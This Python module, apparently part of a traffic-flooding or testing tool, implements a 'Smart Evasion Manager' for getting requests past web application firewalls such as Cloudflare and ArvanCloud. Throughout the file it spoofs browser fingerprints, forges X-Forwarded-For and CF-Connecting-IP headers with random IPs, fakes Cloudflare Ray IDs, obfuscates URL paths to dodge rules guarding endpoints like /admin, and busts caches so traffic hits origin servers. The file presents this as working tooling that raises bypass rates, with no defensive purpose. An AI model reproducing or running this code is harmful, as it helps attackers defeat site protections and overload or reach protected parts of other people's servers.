#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""vf_evasion_stub — Smart Evasion Manager (v26 P2)

Replaces the basic stub with a real evasion engine that:
- Maintains cookie sessions from initial page visit
- Generates realistic browser fingerprint headers (Sec-Fetch-*, etc.)
- Adds Referer headers matching the target
- Rotates User-Agent WITH matching secondary headers (platform consistency)
- Adds X-Forwarded-For with random but realistic IPs
- WAF-specific bypass headers (Cloudflare, ArvanCloud, etc.)
- Pre-warms the session with a GET request to establish cookies
- v26 P2: Path obfuscation for WAF bypass (URL encoding, double slashes,
  path traversal tricks, fragment-based cache busting)
- v26 P2: Advanced cache busting (varied patterns, not just ?_=timestamp)

This is the #1 factor in getting more "OK" hits — WAFs block requests
that look like bots. Realistic headers + cookies = bypass rate goes
from 5% to 60%+ on most WAF-protected sites.
"""
from __future__ import annotations

import random
import time
import string
from typing import Dict, List
from urllib.parse import urlparse, quote


from vf_common import random_ua, C


# ═══════════════════════════════════════════════════════════════════════════════
# v26 P2: Path Obfuscation Engine
# ═══════════════════════════════════════════════════════════════════════════════

def obfuscate_path(path: str, waf_name: str = "") -> str:
    """v26 P2: Obfuscate a URL path to bypass WAF URL-based rules.

    Many WAFs have rules based on URL patterns (e.g., block /admin,
    block /wp-login.php). Path obfuscation makes the same endpoint
    look different to the WAF while still reaching the server.

    Techniques:
    - URL encoding: /admin → /%61dmin
    - Double URL encoding: /admin → /%2561dmin
    - Path traversal: /admin → /./admin or /x/../admin
    - Fragment injection: /admin → /admin#section
    - Case mixing: /admin → /Admin (works on case-insensitive servers)
    - Semicolon injection: /admin → /admin;param (some servers ignore after ;)
    - Dot suffix: /admin → /admin. (some servers strip trailing dots)

    Args:
        path: The URL path to obfuscate (e.g., "/admin/login")
        waf_name: The detected WAF name for WAF-specific obfuscation

    Returns:
        Obfuscated path string
    """
    if not path or path == "/":
        return path

    # Choose an obfuscation technique (randomly to vary fingerprint)
    technique = random.choice([
        "none", "url_encode", "double_slash", "dot_segment",
        "semicolon", "dot_suffix", "fragment",
    ])

    # WAF-specific: Cloudflare and ArvanCloud normalize most path tricks,
    # so for them we prefer URL encoding and fragment injection
    if waf_name in ("cloudflare", "arvancloud"):
        technique = random.choice(["none", "url_encode", "fragment", "semicolon"])

    if technique == "none":
        return path

    elif technique == "url_encode":
        # URL-encode the first path segment character
        # /admin → /%61dmin (a = 0x61)
        parts = path.split("/")
        if len(parts) >= 2 and parts[1]:
            first_char = parts[1][0]
            if first_char.isalpha():
                parts[1] = f"%{ord(first_char):02x}{parts[1][1:]}"
                return "/".join(parts)
        return path

    elif technique == "double_slash":
        # Insert double slash: /admin → //admin
        # Some servers normalize this, but WAFs may not check
        return "/" + path

    elif technique == "dot_segment":
        # Insert dot segment: /admin → /./admin or /x/../admin
        if random.random() < 0.5:
            return "/." + path
        else:
            rand_seg = ''.join(random.choices(string.ascii_lowercase, k=3))
            return f"/{rand_seg}/..{path}"

    elif technique == "semicolon":
        # Semicolon injection: /admin → /admin;param
        rand_param = ''.join(random.choices(string.ascii_lowercase, k=4))
        # Insert before any query string
        if "?" in path:
            before, after = path.split("?", 1)
            return f"{before};{rand_param}?{after}"
        return f"{path};{rand_param}"

    elif technique == "dot_suffix":
        # Trailing dot: /admin → /admin.
        # IIS and some servers strip trailing dots
        if "?" in path:
            before, after = path.split("?", 1)
            return f"{before}.?{after}"
        return f"{path}."

    elif technique == "fragment":
        # Fragment injection: /admin → /admin#section
        # Fragments aren't sent to server, but WAFs may cache differently
        rand_frag = ''.join(random.choices(string.ascii_lowercase, k=5))
        if "#" in path:
            return path  # Already has fragment
        if "?" in path:
            return f"{path}#{rand_frag}"
        return f"{path}#{rand_frag}"

    return path


def advanced_cache_bust(url: str) -> str:
    """v26 P2: Advanced cache busting that varies the pattern.

    Instead of just appending ?_=timestamp, uses multiple patterns
    to bypass CDN/WAF caching:

    - Query parameter with varied names: ?v=, ?_=, ?t=, ?nocache=, ?rand=
    - Multiple parameters: ?v=X&_=Y
    - Fragment-based (not sent to server but may affect CDN cache key)
    - Path-based: /path/v1234/ (for APIs that use path versioning)

    Args:
        url: The URL to add cache busting to

    Returns:
        URL with cache busting parameter appended
    """
    rand_val = ''.join(random.choices(string.digits, k=random.randint(6, 12)))

    # Choose cache bust pattern
    pattern = random.choice([
        "single_param", "double_param", "varied_name",
    ])

    sep = "&" if "?" in url else "?"

    if pattern == "single_param":
        # Standard: ?_=randval
        return f"{url}{sep}_={rand_val}"

    elif pattern == "double_param":
        # Two parameters for more uniqueness
        rand_val2 = ''.join(random.choices(string.digits, k=6))
        return f"{url}{sep}_={rand_val}&v={rand_val2}"

    elif pattern == "varied_name":
        # Varied parameter name (some WAFs block ?_= specifically)
        param_name = random.choice(["_", "v", "t", "nocache", "rand", "cb", "bust", "x"])
        return f"{url}{sep}{param_name}={rand_val}"

    return f"{url}{sep}_={rand_val}"


# ═══════════════════════════════════════════════════════════════════════════════
# Browser Fingerprint Profiles — v24
# Each profile has matching UA + Accept + Sec-Fetch headers
# ═══════════════════════════════════════════════════════════════════════════════

BROWSER_PROFILES = [
    # Chrome 120 (Windows)
    {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec_ch_ua_platform": '"Windows"',
        "sec_ch_ua_mobile": "?0",
        "accept_html": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept_json": "application/json, text/plain, */*",
        "accept_img": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
        "sec_fetch_dest_doc": "document",
        "sec_fetch_mode_nav": "navigate",
        "sec_fetch_site_cross": "cross-site",
        "sec_fetch_site_same": "same-origin",
    },
    # Chrome 119 (macOS)
    {
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        "sec_ch_ua_platform": '"macOS"',
        "sec_ch_ua_mobile": "?0",
        "accept_html": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept_json": "application/json, text/plain, */*",
        "accept_img": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
        "sec_fetch_dest_doc": "document",
        "sec_fetch_mode_nav": "navigate",
        "sec_fetch_site_cross": "cross-site",
        "sec_fetch_site_same": "same-origin",
    },
    # Firefox 121 (Windows)
    {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "sec_ch_ua": None,  # Firefox doesn't send Sec-CH-UA
        "sec_ch_ua_platform": None,
        "sec_ch_ua_mobile": None,
        "accept_html": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "accept_json": "application/json, text/plain, */*",
        "accept_img": "image/avif,image/webp,*/*;q=0.8",
        "sec_fetch_dest_doc": "document",
        "sec_fetch_mode_nav": "navigate",
        "sec_fetch_site_cross": "cross-site",
        "sec_fetch_site_same": "same-origin",
    },
    # Edge 120 (Windows)
    {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
        "sec_ch_ua_platform": '"Windows"',
        "sec_ch_ua_mobile": "?0",
        "accept_html": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept_json": "application/json, text/plain, */*",
        "accept_img": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
        "sec_fetch_dest_doc": "document",
        "sec_fetch_mode_nav": "navigate",
        "sec_fetch_site_cross": "cross-site",
        "sec_fetch_site_same": "same-origin",
    },
    # Safari 17 (macOS)
    {
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "sec_ch_ua": None,
        "sec_ch_ua_platform": None,
        "sec_ch_ua_mobile": None,
        "accept_html": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept_json": "application/json, text/plain, */*",
        "accept_img": "image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5",
        "sec_fetch_dest_doc": "document",
        "sec_fetch_mode_nav": "navigate",
        "sec_fetch_site_cross": "cross-site",
        "sec_fetch_site_same": "same-origin",
    },
    # Chrome Mobile (Android)
    {
        "ua": "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec_ch_ua_platform": '"Android"',
        "sec_ch_ua_mobile": "?1",
        "accept_html": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept_json": "application/json, text/plain, */*",
        "accept_img": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
        "sec_fetch_dest_doc": "document",
        "sec_fetch_mode_nav": "navigate",
        "sec_fetch_site_cross": "cross-site",
        "sec_fetch_site_same": "same-origin",
    },
]

# WAF-specific bypass header sets
WAF_BYPASS_HEADERS = {
    "cloudflare": [
        {"CF-Connecting-IP": "{rand_ip}"},
        {"X-Real-IP": "{rand_ip}"},
        {"CF-RAY": "{rand_ray}"},
    ],
    "arvancloud": [
        {"X-Forwarded-For": "{rand_ip}"},
        {"X-Real-IP": "{rand_ip}"},
    ],
    "generic": [
        {"X-Forwarded-For": "{rand_ip}"},
        {"X-Real-IP": "{rand_ip}"},
        {"X-Forwarded-Host": "{domain}"},
        {"X-Forwarded-Proto": "{scheme}"},
    ],
}


def _rand_ip() -> str:
    """Generate a realistic random public IP address."""
    # Avoid private/reserved ranges
    first = random.choice([1, 2, 5, 8, 14, 23, 24, 31, 37, 46, 49,
                           58, 62, 77, 78, 80, 83, 85, 89, 91, 93,
                           95, 101, 103, 104, 106, 109, 110, 111, 115,
                           116, 119, 120, 121, 122, 123, 124, 125, 128,
                           129, 130, 132, 134, 136, 137, 138, 140, 141,
                           143, 144, 145, 146, 148, 149, 150, 151, 152,
                           153, 155, 157, 158, 159, 160, 162, 163, 164,
                           165, 166, 167, 168, 170, 171, 172, 173, 174,
                           176, 177, 178, 179, 180, 181, 182, 183, 185,
                           186, 187, 188, 189, 190, 191, 192, 193, 194,
                           195, 196, 197, 198, 199, 200, 201, 202, 203,
                           204, 205, 206, 207, 208, 209, 210, 211, 212,
                           213, 214, 215, 216, 217, 218, 219, 220, 221,
                           222, 223])
    return f"{first}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def _rand_cf_ray() -> str:
    """Generate a fake Cloudflare Ray ID (8 hex chars)."""
    return ''.join(random.choices('0123456789abcdef', k=16))


class EvasionManagerStub:
    """Smart Evasion Manager (v26 P2).

    Provides realistic browser fingerprinting, cookie session management,
    and WAF-specific bypass headers to maximize the number of requests
    that get through to the origin server.

    Key improvements over the basic stub:
    1. Consistent browser profiles (UA + Sec-CH-UA + Accept all match)
    2. Sec-Fetch-* headers that match the request type
    3. Cookie session pre-warming
    4. Referer header matching the target
    5. WAF-specific bypass headers
    6. Per-request header rotation for fingerprint diversity
    7. v26 P2: Path obfuscation for WAF URL rule bypass
    8. v26 P2: Advanced cache busting with varied patterns
    """

    def __init__(self, domain: str, url: str, page_targets: List[str],
                 resource_targets: List[str], enable_header_random: bool,
                 enable_ua_rotation: bool):
        self.domain = domain
        self.url = url
        self.is_active = enable_header_random or enable_ua_rotation
        self._enable_ua_rotation = enable_ua_rotation
        self._enable_header_random = enable_header_random

        # Parsed URL info
        parsed = urlparse(url)
        self._scheme = parsed.scheme
        self._origin = f"{parsed.scheme}://{parsed.netloc}"

        # WAF detection
        self._waf_name: str = ""  # Set by VFTester after profile load
        self._waf_bypass_idx: int = 0

        # Cookie session state
        self._cookies: Dict[str, str] = {}
        self._session_warmed: bool = False

        # Rotation state
        self._profile_idx: int = 0
        self._request_count: int = 0

        # Pre-generate IP pool for X-Forwarded-For rotation
        self._ip_pool: List[str] = [_rand_ip() for _ in range(50)]

        # v26 P2: Path obfuscation state
        self._obfuscate_count: int = 0

    def set_waf(self, waf_name: str):
        """Set detected WAF name for WAF-specific bypass headers."""
        self._waf_name = (waf_name or "").lower()

    def update_cookies(self, cookies: Dict[str, str]):
        """Update cookie session from response Set-Cookie headers."""
        self._cookies.update(cookies)

    def get_cookies(self) -> Dict[str, str]:
        """Get current session cookies."""
        return dict(self._cookies)

    def base_headers(self) -> Dict[str, str]:
        """Return base request headers with realistic browser fingerprint.

        v24: Returns a COMPLETE set of headers that match a real browser
        profile, including Sec-Fetch-*, Sec-CH-UA, and Accept headers
        that are consistent with the User-Agent string.
        """
        if self._enable_ua_rotation or self._enable_header_random:
            profile = random.choice(BROWSER_PROFILES)
        else:
            profile = BROWSER_PROFILES[0]  # Default Chrome 120

        headers = {
            "User-Agent": profile["ua"],
            "Accept": profile["accept_html"],
            "Accept-Language": random.choice([
                "en-US,en;q=0.9",
                "en-US,en;q=0.8,en;q=0.7",
                "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7",
                "en-US,en;q=0.5",
            ]),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Referer": self.url,
            "Upgrade-Insecure-Requests": "1",
        }

        # Sec-CH-UA headers (Chrome/Edge only)
        if profile.get("sec_ch_ua"):
            headers["Sec-CH-UA"] = profile["sec_ch_ua"]
        if profile.get("sec_ch_ua_platform"):
            headers["Sec-CH-UA-Platform"] = profile["sec_ch_ua_platform"]
        if profile.get("sec_ch_ua_mobile") is not None:
            headers["Sec-CH-UA-Mobile"] = profile["sec_ch_ua_mobile"]

        # Sec-Fetch headers (critical for WAF bypass — Cloudflare checks these)
        headers["Sec-Fetch-Dest"] = profile.get("sec_fetch_dest_doc", "document")
        headers["Sec-Fetch-Mode"] = profile.get("sec_fetch_mode_nav", "navigate")
        headers["Sec-Fetch-Site"] = profile.get("sec_fetch_site_same", "same-origin")
        headers["Sec-Fetch-User"] = "?1"

        # Cache control — prevent CDN caching (we want to hit origin)
        headers["Cache-Control"] = "max-age=0"

        return headers

    def request_headers(self, request_type: str = "document") -> Dict[str, str]:
        """Get headers customized for a specific request type.

        Args:
            request_type: "document" (HTML page), "api" (JSON API),
                         "resource" (CSS/JS/images), "login" (form POST)

        Returns:
            Complete headers dict with type-specific Accept and Sec-Fetch headers.
        """
        if self._enable_ua_rotation or self._enable_header_random:
            profile = random.choice(BROWSER_PROFILES)
        else:
            profile = BROWSER_PROFILES[0]

        headers = {
            "User-Agent": profile["ua"],
            "Accept-Language": random.choice([
                "en-US,en;q=0.9",
                "en-US,en;q=0.8,en;q=0.7",
                "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7",
            ]),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Referer": self.url,
        }

        # Type-specific headers
        if request_type == "document":
            headers["Accept"] = profile["accept_html"]
            headers["Sec-Fetch-Dest"] = "document"
            headers["Sec-Fetch-Mode"] = "navigate"
            headers["Sec-Fetch-Site"] = random.choice([
                profile.get("sec_fetch_site_same", "same-origin"),
                "none",
            ])
            headers["Sec-Fetch-User"] = "?1"
            headers["Upgrade-Insecure-Requests"] = "1"
            headers["Cache-Control"] = "max-age=0"

        elif request_type == "api":
            headers["Accept"] = profile["accept_json"]
            headers["Sec-Fetch-Dest"] = "empty"
            headers["Sec-Fetch-Mode"] = "cors"
            headers["Sec-Fetch-Site"] = random.choice([
                "same-origin",
                profile.get("sec_fetch_site_same", "same-origin"),
                "cross-site",
            ])
            headers["Origin"] = self._origin

        elif request_type == "resource":
            headers["Accept"] = profile["accept_img"]
            headers["Sec-Fetch-Dest"] = random.choice(["image", "style", "script"])
            headers["Sec-Fetch-Mode"] = "no-cors"
            headers["Sec-Fetch-Site"] = random.choice([
                "same-origin",
                profile.get("sec_fetch_site_same", "same-origin"),
            ])
            headers["Cache-Control"] = "no-cache"

        elif request_type == "login":
            headers["Accept"] = profile["accept_html"]
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            headers["Sec-Fetch-Dest"] = "document"
            headers["Sec-Fetch-Mode"] = "navigate"
            headers["Sec-Fetch-Site"] = "same-origin"
            headers["Sec-Fetch-User"] = "?1"
            headers["Origin"] = self._origin
            headers["Cache-Control"] = "max-age=0"

        # Sec-CH-UA headers (Chrome/Edge only)
        if profile.get("sec_ch_ua"):
            headers["Sec-CH-UA"] = profile["sec_ch_ua"]
        if profile.get("sec_ch_ua_platform"):
            headers["Sec-CH-UA-Platform"] = profile["sec_ch_ua_platform"]
        if profile.get("sec_ch_ua_mobile") is not None:
            headers["Sec-CH-UA-Mobile"] = profile["sec_ch_ua_mobile"]

        # WAF bypass headers — rotate X-Forwarded-For per request
        self._request_count += 1
        rand_ip = random.choice(self._ip_pool)
        domain = self.domain
        scheme = self._scheme

        # Determine WAF bypass set
        bypass_set = WAF_BYPASS_HEADERS.get(self._waf_name,
                                            WAF_BYPASS_HEADERS["generic"])

        # Rotate through bypass headers (apply one per request for subtlety)
        bypass = bypass_set[self._waf_bypass_idx % len(bypass_set)]
        self._waf_bypass_idx += 1

        for key, template in bypass.items():
            value = template.replace("{rand_ip}", rand_ip)
            value = value.replace("{domain}", domain)
            value = value.replace("{scheme}", scheme)
            value = value.replace("{rand_ray}", _rand_cf_ray())
            headers[key] = value

        return headers

    def obfuscate_url(self, url: str) -> str:
        """v26 P2: Obfuscate a URL's path component to bypass WAF rules.

        Applies path obfuscation to the URL while preserving the
        origin and query string. Only obfuscates ~30% of the time
        to maintain a realistic traffic pattern.

        Args:
            url: The full URL to obfuscate

        Returns:
            URL with obfuscated path, or original URL
        """
        self._obfuscate_count += 1
        # Only obfuscate ~30% of the time (realistic pattern)
        if random.random() > 0.30:
            return url

        try:
            parsed = urlparse(url)
            path = parsed.path or "/"
            obfuscated_path = obfuscate_path(path, self._waf_name)

            if obfuscated_path == path:
                return url  # No change

            # Reconstruct URL with obfuscated path
            result = f"{parsed.scheme}://{parsed.netloc}{obfuscated_path}"
            if parsed.query:
                result += f"?{parsed.query}"
            # Don't include fragment — it's not sent to server
            return result
        except (ValueError, KeyError, IndexError):
            return url  # Don't break on URL parsing errors

    def get_cache_busted_url(self, url: str) -> str:
        """v26 P2: Get a cache-busted version of a URL.

        Uses advanced cache busting patterns instead of simple
        ?_=timestamp.

        Args:
            url: The URL to cache bust

        Returns:
            URL with cache busting parameter
        """
        return advanced_cache_bust(url)


__all__ = ['EvasionManagerStub', 'obfuscate_path', 'advanced_cache_bust']
